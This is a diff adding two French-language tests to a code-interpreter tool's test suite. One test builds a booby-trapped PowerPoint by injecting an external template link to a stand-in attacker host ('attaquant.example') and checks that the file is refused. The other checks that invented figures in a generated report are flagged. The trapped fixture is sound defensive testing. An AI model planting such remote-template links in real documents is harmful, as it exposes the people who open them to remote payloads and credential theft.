@@ -49,6 +49,65 @@ describe("Interpréteur de code", () => {
     assert.equal((await files.list(tenant, conversation)).length, 2);
   });
 
+  it("documents Office : livrés s'ils sont sains ; refusés avec une macro ou un modèle distant (le modèle le lit)", async () => {
+    const { readFileSync } = await import("node:fs");
+    const { strToU8, unzipSync, zipSync } = await import("fflate");
+    const real = readFileSync(new URL("../files/fixtures/chart.pptx", import.meta.url));
+    // Le même document, piégé : un modèle distant ajouté à ses relations.
+    const parts = unzipSync(new Uint8Array(real));
+    parts["ppt/_rels/presentation.xml.rels"] = strToU8(
+      new TextDecoder().decode(parts["ppt/_rels/presentation.xml.rels"]).replace(
+        "</Relationships>",
+        '<Relationship Id="rX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://attaquant.example/m.potm" TargetMode="External"/></Relationships>',
+      ),
+    );
+    const trapped = Buffer.from(zipSync(parts));
+    const pptx = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
+    const { run, files } = setup({
+      files: [
+        { name: "bilan.pptx", mediaType: pptx, size: real.length, data: real.toString("base64") },
+        { name: "piege.pptx", mediaType: pptx, size: trapped.length, data: trapped.toString("base64") },
+      ],
+    });
+    const result = await run("deck.save()");
+    assert.match(result.content, /Fichiers donnés à l'utilisateur[^\n]*bilan\.pptx/);
+    assert.match(result.content, /Fichiers refusés[^\n]*piege\.pptx/);
+    const ids = generatedFileIds([{ role: "tool", name: "run_code", data: result.data }]);
+    assert.deepEqual((await Promise.all(ids.map((id) => files.content(tenant, conversation, id)))).map((file) => file?.name), ["bilan.pptx"]);
+  });
+
+  it("fidélité : chiffres inventés dans un document signalés au modèle (fichier livré quand même) ; données fournies non signalées", async () => {
+    const { readFileSync } = await import("node:fs");
+    const report = readFileSync(new URL("../files/fixtures/rapport-invente.docx", import.meta.url));
+    const docx = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
+    const sandbox: CodeSandbox = {
+      run: async () => ({ exitCode: 0, timedOut: false, durationMs: 900, stdout: "", stderr: "", files: [{ name: "rapport.docx", mediaType: docx, size: report.length, data: report.toString("base64") }] }),
+    };
+    const files = new MemoryGeneratedFileStore();
+    const tool = codeTool({ sandbox, runs: { count: 0 }, saveFile: (file) => files.create(tenant, conversation, file) });
+    assert.equal(tool.grounded, true);
+    const call = { id: "c", name: "run_code", arguments: { code: "doc.save()" } };
+
+    // Nombres reçus : ceux de la demande. Les délais par gravité (4, 12, 24 h) n'y sont pas.
+    const known = [42, 31, 9, 2, 6];
+    const checked = await runTool([tool], call, signal, undefined, undefined, undefined, known);
+    // En tête du résultat (après la sortie du script, le modèle l'ignorait).
+    assert.match(checked.content, /^À FAIRE AVANT DE RÉPONDRE — contrôle de fidélité : rapport\.docx[^\n]*: 4, 12, 24\./);
+    assert.match(checked.summary ?? "", /chiffres à vérifier : 4, 12, 24$/);
+    assert.deepEqual((checked.data as { unsupported: unknown }).unsupported, [{ file: "rapport.docx", numbers: ["4", "12", "24"] }]);
+    assert.equal(generatedFileIds([{ role: "tool", name: "run_code", data: checked.data }]).length, 1);
+
+    // Si la demande donnait ces délais, rien n'est signalé.
+    const given = await runTool([tool], call, signal, undefined, undefined, undefined, [...known, 4, 12, 24]);
+    assert.doesNotMatch(given.content, /fidélité/);
+
+    // Ni s'ils viennent d'un fichier fourni au code (CSV joint).
+    const csv = Buffer.from("gravite,delai_h\nmineur,4\nmajeur,12\ncritique,24");
+    const withInputs = codeTool({ sandbox, runs: { count: 0 }, saveFile: (file) => files.create(tenant, conversation, file), inputs: async () => [{ name: "delais.csv", bytes: csv }] });
+    const fromFile = await runTool([withInputs], { ...call, arguments: { code: "doc.save()", files: ["delais.csv"] } }, signal, undefined, undefined, undefined, known);
+    assert.doesNotMatch(fromFile.content, /fidélité/);
+  });
+
   it("refuse un type non autorisé et un fichier signalé par l'antivirus", async () => {
     const { run } = setup(
       {
